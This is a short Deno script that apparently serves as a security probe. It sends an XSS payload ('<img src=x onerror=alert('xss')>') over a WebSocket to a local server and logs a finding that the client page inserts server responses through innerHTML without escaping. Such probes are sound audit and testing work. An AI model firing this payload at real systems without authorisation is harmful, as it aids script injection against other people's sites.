const target = Deno.args[0] ?? "ws://localhost:5000/wss";

const ws = new WebSocket(target);
const payload = JSON.stringify({
  type: "data",
  data: "<img src=x onerror=alert('xss')>",
});

const response = await new Promise<string>((resolve) => {
  const timer = setTimeout(() => resolve("[INFO] timeout"), 4000);
  ws.onopen = () => ws.send(payload);
  ws.onmessage = (event) => {
    clearTimeout(timer);
    resolve(String(event.data));
    ws.close();
  };
  ws.onerror = () => {
    clearTimeout(timer);
    resolve("[INFO] websocket error");
  };
});

console.log("[INFO] server response to xss probe");
console.log(response);
console.log("[VULN][CRITICAL] static/index.html renders server error messages and several response fields via innerHTML without escaping; browser verification required to demonstrate execution path");